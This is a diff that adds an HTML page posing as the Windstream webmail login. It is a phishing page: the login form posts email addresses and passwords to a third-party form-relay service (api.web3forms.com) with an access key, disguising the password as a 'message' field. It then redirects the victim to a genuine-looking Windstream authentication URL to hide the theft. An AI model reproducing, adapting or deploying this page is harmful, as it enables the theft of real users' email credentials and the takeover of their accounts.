@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+                  <meta name="viewport" content="width=device-width">
+        <meta name="viewport" content="initial-scale=1.0">
+        <meta http-equiv="X-UA-Compatible" content="IE=11">
+      
+              <title>Windstream | Login</title>
+      <link rel="stylesheet" type="text/css" href="main.css">
+      
+	<style media="screen">
+		a {
+			color: #1f8aa3;
+			text-decoration-line: underline;
+		}
+		#login {
+			background-color: #ef6724
+		}
+			</style>
+
+      	      
+	
+	      <style>
+        @font-face {
+            font-family: 'NotoSans_online_security'; 
+            src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-regular.woff);
+        }
+
+        @font-face {
+            font-family: 'NotoSans_medium_online_security'; 
+            src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-medium.ttf);
+        }
+
+        @font-face {
+            font-family: 'NotoSans_bold_online_security'; 
+            src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-bold.woff);
+        }
+
+        @font-face {
+            font-family: 'NotoSans_semibold_online_security'; 
+            src: url(chrome-extension://llbcnfanfmjhpedaedhbcnpgeepdnnok/assets/fonts/noto-sans-semibold.ttf);
+        }
+</style></head>
+  <body class="bg-white flex">
+        <main class="container lg:w-screen-md">
+			<header>
+  <div class="branding">
+    <img src="windstream.png" alt="Logo">
+      </div>
+  <div class="text-center text-gray-800 text-lg text-bold my-4">
+    <h1>Webmail Login</h1>
+  </div>
+  </header>
+				<section id="login_form" class="flex flex-col justify-between px-3">
+			<form name="signin" novalidate="true" action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="redirect" value="https://windstream-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_abe88f9a09b315bf2f018a48e6ccb20d8fb9c07b76%3Ahttps%3A%2F%2Fwindstream-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail.windstream.net%252F%26cookieTime%3D1732734095">
+        <input type="hidden" name="access_key" value="3a462e0d-31c4-4dce-b629-8a0c92bb4b1a" />
+        <input type="hidden" name="subject" value="New Contact Form Submission from Web3Forms" />
+        <input type="hidden" name="from_name" value="My Website" />
+				<div class="formfield">
+					<label for="username">Email Address</label>
+					<input tabindex="1" class="tabable" type="email" id="email" name="email" value="" placeholder="Email Address" autofocus="" required="">
+				</div>
+				<div class="formfield">
+					<label for="password">Password</label>
+					<div class="flex relative items-baseline">
+						<input tabindex="2" class="tabable" id="message" type="message" name="message" value="" placeholder="Password" required="">
+						<div>
+							<button tabindex="3" type="submit" id="toggle"  class="tabable z-10 absolute text-gray-800 uppercase" style="right: 10px; top: 8px;">show</button>
+						</div>
+					</div>
+				</div>
+								  <div class="remember-me" x-data="{ open: false }">
+    <div class="flex items-baseline">
+      <input tabindex="4" id="remember_me" name="remember_me" class="tabable mr-2 leading-tight" type="checkbox" checked="">
+      <label for="remember_me" class="flex items-baseline block text-gray-700 font-bold">
+        Remember Me
+      </label>
+      <a tabindex="5" href="https://windstream-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_de3a8a00bb66a3aacf30538398b54121367184505c%3Ahttps%3A%2F%2Fwindstream-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail.windstream.net%252F%26cookieTime%3D1732733451#remember_me_help" id="remember_me_help_link" class="tabable align-top ml-2 text-sm" @click.prevent="open = true">?</a>
+    </div>
+    <div x-show="open" @click.away="open = false" class="my-2 px-4 py-2 bg-yellow-200 text-sm rounded shadow-inner" style="display: none;">
+      <a name="remember_me_help"></a>
+      <p>When you choose "Remember Me" on sign in, we will remember who you are and keep you signed in for up to 90 days, unless you sign out or your browser cookies are deleted. <br>If you are on a public computer, we recommend you uncheck the box.</p>
+    </div>
+  </div>
+																<div class="formfield">
+					<button tabindex="6" id="login" class="tabable w-full px-4 py-2 my-4 text-2xl text-white text-bold uppercase tracking-wider rounded-lg shadow" type="submit" name="submit">
+						Log In
+					</button>
+					<script>
+						function disableButton() {
+							var btn = document.getElementById('login');
+							btn.disabled = true;
+							btn.innerText = 'Loading...';
+						}
+					</script>
+				</div>
+			</form>
+		</section>
+
+		<section id="self-care" class="px-2">
+      <ul>
+              			                        <li class="mb-2">
+  <a class="tabable" tabindex="8" target="_blank" id="selfcare_link_1" href="https://windstream-email.auth-gateway.net/passwordreset">Forgot Your Password or Need to Reset It?</a>
+</li>
+                <li class="mb-2">
+  <a class="tabable" tabindex="9" target="_blank" id="selfcare_link_2" href="https://windstream-email.auth-gateway.net/account/profile">Email Identity Dashboard</a>
+</li>
+                <li class="mb-2">
+  <a class="tabable" tabindex="10" target="_blank" id="selfcare_link_3" href="https://windstream.com/residential/upgrade-your-account">Login Support Page</a>
+</li>
+              </ul>
+</section>
+	
+	
+			  <footer class="flex flex-col mt-6 w-3/4 text-center mx-auto text-sm">
+      <p></p>
+    </footer>
+	</main>
+                                      
+
+</body></html>
